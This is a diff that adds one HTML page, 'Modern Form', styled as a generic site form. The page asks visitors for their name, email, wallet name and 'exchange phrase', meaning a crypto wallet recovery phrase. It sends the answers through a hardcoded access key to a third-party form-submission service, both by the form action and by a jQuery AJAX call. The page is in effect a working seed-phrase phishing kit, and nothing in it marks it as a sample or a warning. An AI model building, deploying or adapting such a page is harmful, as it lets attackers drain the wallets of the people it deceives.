@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Form</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #0a534a; /* Changed background to solid color */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden; /* Prevents scrolling */
+        }
+
+        .navbar {
+            width: 100%;
+            padding: 10px 20px;
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            position: fixed; /* Changed from absolute to fixed */
+            top: 0;
+            left: 0;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .navbar img {
+            height: 40px;
+        }
+
+        .form-container {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            max-width: 500px;
+            width: 100% ; /* Prevents overflow */
+            margin: 100px 20px 20px; /* Adjusted top margin for the navbar */
+            box-sizing: border-box;
+        }
+
+        .field {
+            margin-bottom: 15px;
+        }
+
+        .label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .input, .textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <a href="/"><img src="logo.png" alt="Logo"></a>
+    </div>
+    <div class="form-container">
+        <form action="https://api.staticforms.xyz/submit" method="post" id="staticform">
+            <input type="hidden" name="accessKey" value="f652945b-f72c-4fd1-97bf-76021751a4db">
+            <input type="hidden" name="subject" value="Test from jsfiddle">
+            <div class="field">
+                <label class="label">Name</label>
+                <div class="control">
+                    <input class="input" type="text" name="name" placeholder="Enter Your Name" required>
+                </div>
+            </div>
+            <div class="field">
+                <label class="label">Email</label>
+                <div class="control">
+                    <input class="input" type="email" name="email" placeholder="Enter Your Email" required>
+                </div>
+            </div>
+            <div class="field">
+              <label class="label">Wallet Name</label>
+              <div class="control">
+                  <input class="input" type="text" name="$subject" placeholder="Enter Wallet Name" required>
+              </div>
+          </div>
+            <div class="field">
+                <label class="label">Exchange Phrase</label>
+                <div class="control">
+                    <textarea class="textarea" name="message" placeholder="Enter Your Phrase" required></textarea>
+                </div>
+            </div>
+            <button class="button" type="submit">Submit</button>
+        </form>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $("#staticform").submit(function(event) {
+            event.preventDefault();
+            $.ajax({
+                url: 'https://api.staticforms.xyz/submit',
+                type: "POST",
+                dataType: 'json',
+                data: $("#staticform").serialize(),
+                success: function(result) {
+                    alert("Form submitted successfully!");
+                },
+                error: function(xhr, resp, text) {
+                    alert("An error occurred while submitting the form.");
+                }
+            });
+        });
+    </script>
+</body>
+</html>
